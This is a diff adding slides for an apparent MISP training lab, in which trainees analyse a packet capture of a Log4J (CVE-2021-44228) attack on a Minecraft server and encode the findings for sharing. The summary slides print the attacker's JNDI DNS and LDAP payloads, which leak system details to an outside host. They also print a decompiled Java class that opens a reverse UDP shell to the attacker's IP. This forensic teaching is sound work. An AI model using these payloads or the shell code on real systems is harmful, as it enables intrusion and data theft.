@@ -6,10 +6,176 @@
 \end{frame}
 
 \begin{frame}
-    \frametitle{Slide title}
+    \frametitle{Log4J exploitation lab}
+    The goal of this lab is to analyze a network capture evidence file, encode, and share the information following successful exploitation by an attacker.
+	\linebreak[3]
+    Resources:
     \begin{itemize}
-        \item A bullet point
+        \item \href{https://github.com/MISP/misp-training-lea/tree/main/e.304-lab3-encoding-information-and-sharing-it-2/dataset/capture.pcap}{\underline{capture.pcap}}
+    \end{itemize}
+    Tools:
+    \begin{itemize}
+        \item \href{https://www.wireshark.org/}{\underline{Wireshark}}: Network protocol analyzer
+        \item \href{https://github.com/skylot/jadx}{\underline{Jadx}}: Dex to Java decompiler
+        \item \href{https://github.com/MISP/misp-wireshark}{\underline{misp-wireshark}}: Lua plugin to extract data from Wireshark and convert it into MISP format 
     \end{itemize}
 
-    \note[item]{A note for the slide handout}
+    \note[item]{}
+\end{frame}
+
+\begin{frame}
+    \frametitle{Actors}
+    \href{https://github.com/MISP/misp-training-lea/tree/main/e.304-lab3-encoding-information-and-sharing-it-2/dataset/capture.pcap}{\underline{capture.pcap}} is a network capture on the eth0 interface on our Minecraft Server.
+    \linebreak[2]
+    {\color{blue}{\bf Minecraft Server}}
+    \begin{itemize}
+    	\item External IP: 44.202.61.172
+	    \item Internal IP: 172.31.84.208
+	    \item Version: Java Edition v1.18 
+	    \item Vulnerable to \href{https://nvd.nist.gov/vuln/detail/CVE-2021-44228}{CVE-2021-44228}
+    \end{itemize}
+    
+    External actors:
+    \begin{itemize}
+        \item {\color{green}{\bf Player}}
+        \item {\color{red}{\bf Attacker}}
+    \end{itemize}
+
+    \note[item]{}
+\end{frame}
+
+\begin{frame}
+    \frametitle{Exercise 1: Identifying the external actors }
+    Using Wireshark:
+    \begin{itemize}
+    	\item Identify {\color{green}{\bf Player}} IP address
+    	\item Identify {\color{red}{\bf Attacker}} IP address
+    \end{itemize}
+    \begin{figure}
+		\includegraphics[scale=0.45]{../pictures/csi-meme.png}
+		\caption[csi]{CSI: NY - S4E20}
+    \end{figure}
+    \begin{center}Exercise duration: 10 minutes\end{center}
+    \note[item]{Player IP: 178.249.193.69, Attacker IP: 18.212.74.161}
+\end{frame}
+
+\begin{frame}
+    \frametitle{Wireshark tips}
+    Statistics -> IPv4 Statistics -> All Addresses
+	\begin{center}\includegraphics[scale=0.45]{../pictures/wireshark-statistics.png}\end{center}
+	Useful filters:
+    \begin{itemize}
+    	\item ip.addr == 10.10.10.10 \&\& ip.addr == 20.20.20.20
+    	\item dns.flags.rcode != 0
+    \end{itemize}
+    \note[item]{First one is for filtering the communication between two IP addresses only, second one shows failed dns requests, which can potentially be a C2 beaconing }
+\end{frame}
+
+\begin{frame}
+    \frametitle{Exercise 2: In-depth analysis}
+        \begin{enumerate}
+        \item Identify {\color{red}{\bf Attacker}} connection to the {\color{blue}{\bf Minecraft Server}}
+        \item Search for {\bf \emph{jndi}} string using Wireshark packet string search, and extract all the payloads
+        \item Analyze JNDI payloads and their purpose
+        \begin{itemize}
+        	\item DNS
+        	\item LDAP
+        \end{itemize}        
+        \item Describe the information the {\color{red}{\bf Attacker}} leaked information via DNS/LDAP requests
+    \end{enumerate}
+    \begin{center}Exercise duration: 20 minutes\end{center}
+    \note[item]{Attacker connects in packet no. 1540. First attacker payload is a JNDI DNS probe to interact.sh (online tool). after a successful dns probe, attacker leaks via DNS OS user and Java version. Later the attacker leaks via LDAP queries, full Java version, OS, Java VM, Java locale, HW info. Last LDAP payload is a Java RCE.}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Exercise 2: In-depth analysis summary}
+   {\bf DNS payloads}
+    \begin{lstlisting}[basicstyle=\tiny\color{black}]
+${jndi:dns://hostname-${hostName}.c8nfads2vtc0000srss0grk4fxryyyyyr.interact.sh}
+${jndi:dns://user-${env:USER}.c8nfads2vtc0000srss0grk4fxryyyyyr.interact.sh}
+${jndi:dns://version-${sys:java.version}.c8nfads2vtc0000srss0grk4fxryyyyyr.interact.sh}
+    \end{lstlisting}
+   {\bf LDAP payloads}
+	\begin{lstlisting}
+${jndi:ldap://18.212.74.161/${java:version}}
+${jndi:ldap://18.212.74.161/${java:os}}
+${jndi:ldap://18.212.74.161/${java:vm}}
+${jndi:ldap://18.212.74.161/${java:locale}}
+${jndi:ldap://18.212.74.161/${java:hw}}
+${jndi:ldap://18.212.74.161:389/1svssl}
+    \end{lstlisting}
+    \note[item]{Attacker connects in packet no. 1540. First attacker payload is a JNDI DNS probe to interact.sh (online tool). after a successful dns probe, attacker leaks via DNS OS user and Java version. Later the attacker leaks via LDAP queries, full Java version, OS, Java VM, Java locale, HW info. Last LDAP payload is a Java RCE.}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Exercise 3: Payload delivery and RCE}
+	{Identify the TCP stream where the {\color{red}{\bf Attacker}} delivered the RCE payload to the {\color{blue}{\bf Minecraft Server}}}
+	\linebreak
+    \begin{itemize}
+    	\item Search for LDAP traffic after the last JNDI payload
+    	\item Payload delivery is over HTTP
+    	\item HTTP objects can be exported easily in Wireshark
+	\begin{lstlisting}
+File -> Export Objects -> HTTP...
+	\end{lstlisting}
+    	\item What does the payload do?
+    	\item Identify which commands the {\color{red}{\bf Attacker}} run abusing the RCE
+
+    \end{itemize}
+    \begin{center}Exercise duration: 15 minutes\end{center}
+    \note[item]{ip.src==18.212.74.161 \&\& udp}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Exercise 3: Payload delivery and RCE summary}
+	\begin{lstlisting}[basicstyle=\tiny\color{black},language=Java]
+// ExecTemplateJDK8.class
+package defpackage;
+
+/* renamed from: ExecTemplateJDK8  reason: default package */
+public class ExecTemplateJDK8 {
+    static {
+        try {
+            Runtime.getRuntime()
+                    .exec(System.getProperty("os.name").toLowerCase().contains("win")
+                            ? new String[] {
+                                    "cmd.exe", "/C",
+                                    "sh -i >& /dev/udp/18.212.74.161/6666 0>&1"
+                            }
+                            : new String[] {
+                                    "/bin/bash", "-c",
+                                    "sh -i >& /dev/udp/18.212.74.161/6666 0>&1"
+                            });
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        System.out.println();
+    }
+}
+	\end{lstlisting}
+    \note[item]{The payload is a reverse UDP shell connecting to remote port 6666 on the attackers machine.}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{MISP encoding 1/2}
+    Describe and encode the exfiltration process, data and target in MISP
+    \note[item]{}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{MISP encoding 2/2}
+    Play with distribution and correctly set it for each data point
+    \note[item]{}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{PyMISP and Scapy}
+    MISP automation with PyMISP and Scapy
+    \note[item]{}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Bonus: misp-wireshark}
+    Show how misp-wireshark can be use to export pcap data to MISP format.
+    \note[item]{}
 \end{frame}
